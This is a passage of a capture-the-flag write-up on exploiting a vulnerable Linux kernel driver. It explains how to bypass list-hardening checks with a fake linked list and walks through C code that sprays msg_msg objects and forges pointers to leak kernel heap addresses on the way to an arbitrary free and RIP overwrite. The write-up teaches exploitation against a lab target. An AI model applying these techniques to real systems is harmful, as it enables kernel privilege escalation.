+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_three, <span style="color:#66d9ef">sizeof</span>(msg_three) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><h4 id="fake-linked-list-overview">Fake Linked List Overview</h4>
+<p>At this point, we need to think about how to continue our exploitation. Looking at DO_DELETE, we know that it walks the linked list, looks for an object that matches the idx supplied by the user when making the ioctl request, and frees that object. This means that as long as an object with the idx specified exists in the linked list, we will be able to free it, potentially giving us an arbitrary free on not only the object itself, but also the corresponding object at note_addr! So, doesn&rsquo;t that mean that once we have gotten a heap leak, we can link a second fake chemical object directly after the victim object with a new idx (say, idx = 1), and free that object?</p>
+<p><img src="/images/cheminventory/not_fake_linked_list.jpg" alt="Not fake linked list"></p>
+<p>Not quite. Remember that due to CONFIG_LIST_HARDENED, list protections have been enabled? Let&rsquo;s take a look at how the protections are implemented in kernel source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Performs list corruption checks before __list_del_entry(). Returns false if a
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * corruption is detected, true otherwise.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * With CONFIG_LIST_HARDENED only, performs minimal list integrity checking
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * inline to catch non-faulting corruptions, and only if a corruption is
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * detected calls the reporting function __list_del_entry_valid_or_report().
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> __always_inline <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">__list_del_entry_valid</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>entry)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> ret <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">IS_ENABLED</span>(CONFIG_DEBUG_LIST)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>prev <span style="color:#f92672">=</span> entry<span style="color:#f92672">-&gt;</span>prev;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>next <span style="color:#f92672">=</span> entry<span style="color:#f92672">-&gt;</span>next;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * With the hardening version, elide checking if next and prev
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * are NULL, LIST_POISON1 or LIST_POISON2, since the immediate
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * dereference of them below would result in a fault.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 */</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">likely</span>(prev<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">==</span> entry <span style="color:#f92672">&amp;&amp;</span> next<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">==</span> entry))
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> false;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">__list_del_entry_valid_or_report</span>(entry);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In this case, CONFIG_DEBUG_LIST has been enabled, so <code>__list_del_entry_valid_or_report</code> will be called:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Performs the full set of list corruption checks before __list_del_entry().
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * On list corruption reports a warning, and returns false.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> __list_valid_slowpath <span style="color:#a6e22e">__list_del_entry_valid_or_report</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>entry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__list_valid_slowpath
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">__list_del_entry_valid_or_report</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>entry)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>prev, <span style="color:#f92672">*</span>next;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	prev <span style="color:#f92672">=</span> entry<span style="color:#f92672">-&gt;</span>prev;
+</span></span><span style="display:flex;"><span>	next <span style="color:#f92672">=</span> entry<span style="color:#f92672">-&gt;</span>next;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">CHECK_DATA_CORRUPTION</span>(next <span style="color:#f92672">==</span> NULL,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;list_del corruption, %px-&gt;next is NULL</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, entry) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">CHECK_DATA_CORRUPTION</span>(prev <span style="color:#f92672">==</span> NULL,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;list_del corruption, %px-&gt;prev is NULL</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, entry) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">CHECK_DATA_CORRUPTION</span>(next <span style="color:#f92672">==</span> LIST_POISON1,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;list_del corruption, %px-&gt;next is LIST_POISON1 (%px)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>			entry, LIST_POISON1) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">CHECK_DATA_CORRUPTION</span>(prev <span style="color:#f92672">==</span> LIST_POISON2,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;list_del corruption, %px-&gt;prev is LIST_POISON2 (%px)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>			entry, LIST_POISON2) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">CHECK_DATA_CORRUPTION</span>(prev<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">!=</span> entry,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;list_del corruption. prev-&gt;next should be %px, but was %px. (prev=%px)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>			entry, prev<span style="color:#f92672">-&gt;</span>next, prev) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">CHECK_DATA_CORRUPTION</span>(next<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">!=</span> entry,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;list_del corruption. next-&gt;prev should be %px, but was %px. (next=%px)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>			entry, next<span style="color:#f92672">-&gt;</span>prev, next))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EXPORT_SYMBOL</span>(__list_del_entry_valid_or_report);
+</span></span></code></pre></div><p>The following checks are performed to make sure that the list is not corrupted before any list deletion operation can be performed:</p>
+<ol>
+<li>next cannot be NULL</li>
+<li>prev cannot be NULL</li>
+<li>next cannot be LIST_POISON1</li>
+<li>prev cannot be LIST_POISON2</li>
+<li>prev-&gt;next must be equal to the list_head of the object that we are trying to free</li>
+<li>next-&gt;prev must be equal to the list_head of the object that we are trying to free</li>
+</ol>
+<p>Trying to free the fake struct chemical object at idx 1 in the diagram above would hence cause the kernel to kill the process (or crash if panic_on_warn is enabled), as since we are unable to control the chemical_head object, condition 6 cannot be fulfilled. In order to fulfil all 6 conditions, we must create a fake linked list before attempting to leverage the arbitrary free.</p>
+<p>This is what we are trying to achieve (with the necessary leaks and all):</p>
+<p><img src="/images/cheminventory/fake_linked_list_overview.jpg" alt="Fake linked list overview"></p>
+<p>(P.S. I just realized that I could have leaked the victim object and freed fake object 1 instead, reducing the need for an extra fake object. Whoops.)</p>
+<p>Basically, the aim would be to have a fake object that fulfils all the necessary checks, so that when we perform DO_DELETE on the fake object, it will pass all the list checks, freeing the fake object itself, as well as giving us an arbitrary free on whatever is at note_addr. In this case, I wanted to get an arbitrary free on a kmalloc-cg-1k object, so that I can spray pipe_buf and do the classic RIP overwrite via pipe_buf_ops. Note that I have put all the fake objects in a different kmalloc-cg cache, just so to make exploitation easier and more stable.</p>
+<p>Let&rsquo;s compile a list of kernel heap leaks we would require:</p>
+<ul>
+<li>Fake object 1 &ndash; referred to in exploit as kheap_one_addr/msg_one</li>
+<li>Fake object 2 &ndash; referred to in exploit as kheap_two_addr/msg_two</li>
+<li>Fake object 3 &ndash; referred to in exploit as kheap_three_addr/msg_three</li>
+<li>Target kmalloc-cg-1k object to be freed &ndash; referred to in exploit as kheap_1024_addr/msg_secondary</li>
+</ul>
+<h4 id="kernel-heap-leak">Kernel Heap Leak</h4>
+<p>Remember when we performed our cross cache attack by spraying msg_msg, we also sprayed multiple other msg_msgs of different sizes after it? This is to aid us in getting our required heap leaks.</p>
+<p>In each message queue, we have the following msg_msg objects:</p>
+<p><img src="/images/cheminventory/inside_msg_queue.jpg" alt="Inside msg queue"></p>
+<p>Note that the next pointer of each msg_msg object points to the next object in the queue, and note how the entire msg_msg header of the victim header is contained within struct chemical&rsquo;s name array? We know that we can read whatever is inside the name array with DO_READ, and that we have arbitrary read of any data which note_addr points to. We can leverage these in getting our heap leaks.</p>
+<p>To get the address of fake object 1 (in kmalloc-cg-512), we can simply leak the next pointer from the msg_msg header of the victim object via DO_READ.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buf2, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf2));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_chem</span>(<span style="color:#ae81ff">0</span>, buf, buf2); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    kheap_one_addr <span style="color:#f92672">=</span> buf2[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake object 1 address: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kheap_one_addr); 
+</span></span><span style="display:flex;"><span>    vuln_msg <span style="color:#f92672">=</span> buf2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] msg_msg at vulnerable object: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">int</span>) vuln_msg); 
+</span></span><span style="display:flex;"><span>    fake_msg <span style="color:#f92672">=</span> vuln_msg;
+</span></span></code></pre></div><p>In order to get the addresses of the other fake objects, we will need to forge note_addr. We first free the msg_msg over the vulnerable object, then spray a new msg_msg, but this time with note_addr = kheap_one_addr.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing that one specific primary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[vuln_msg], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying new primary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>message, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(message));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x43</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i; 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">192</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>; <span style="color:#75715e">// note_size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">200</span>] <span style="color:#f92672">=</span> kheap_one_addr; <span style="color:#75715e">// note_addr
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p><img src="/images/cheminventory/leak_fake_1.jpg" alt="Leak fake object 1"></p>
+<p>We can now read from fake object 1 as if it was a note attached to struct chemical. This will allow us to leak the next pointer of fake object 1, which would be our target object (secondary_msg) in kmalloc-cg-1k.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buf2, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf2));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_chem</span>(<span style="color:#ae81ff">0</span>, buf, buf2); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    kheap_1024_addr <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] kmalloc-cg-1024 address: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kheap_1024_addr); 
+</span></span><span style="display:flex;"><span>    security_leak <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">5</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] SELinux security pointer leak: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, security_leak);
+</span></span><span style="display:flex;"><span>    vuln_msg <span style="color:#f92672">=</span> buf2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] msg_msg at vulnerable object: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">int</span>) vuln_msg); 
+</span></span></code></pre></div><p>We can do something similar to leak fake object 2 via reading from the target object (secondary_msg):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing that one specific primary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[vuln_msg], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying new primary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>message, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(message));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x44</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">192</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">200</span>] <span style="color:#f92672">=</span> kheap_1024_addr; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buf2, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf2));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_chem</span>(<span style="color:#ae81ff">0</span>, buf, buf2); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    kheap_two_addr <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake object 2 address: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kheap_two_addr); 
+</span></span><span style="display:flex;"><span>    vuln_msg <span style="color:#f92672">=</span> buf2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] msg_msg at vulnerable object: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">int</span>) vuln_msg); 
+</span></span></code></pre></div><p><img src="/images/cheminventory/leak_fake_2.jpg" alt="Leak fake object 2"></p>
+<p>As well as with fake object 3:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying new primary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>message, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(message));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x45</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">192</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">200</span>] <span style="color:#f92672">=</span> kheap_two_addr; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
